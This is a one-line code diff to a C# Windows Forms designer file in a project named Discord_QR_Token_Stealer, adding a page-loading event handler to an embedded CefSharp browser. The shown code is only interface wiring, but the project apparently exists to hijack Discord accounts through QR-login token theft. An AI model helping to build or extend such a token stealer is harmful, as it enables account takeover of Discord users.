@@ -57,6 +57,7 @@ namespace Discord_QR_Token_Stealer
             this.chromiumWebBrowser1.Name = "chromiumWebBrowser1";
             this.chromiumWebBrowser1.Size = new System.Drawing.Size(1251, 666);
             this.chromiumWebBrowser1.TabIndex = 1;
+            this.chromiumWebBrowser1.LoadingStateChanged += new System.EventHandler<CefSharp.LoadingStateChangedEventArgs>(this.chromiumWebBrowser1_LoadingStateChanged);
             this.chromiumWebBrowser1.AddressChanged += new System.EventHandler<CefSharp.AddressChangedEventArgs>(this.chromiumWebBrowser1_AddressChanged);
             this.chromiumWebBrowser1.IsBrowserInitializedChanged += new System.EventHandler(this.chromiumWebBrowser1_IsBrowserInitializedChanged);
             // 
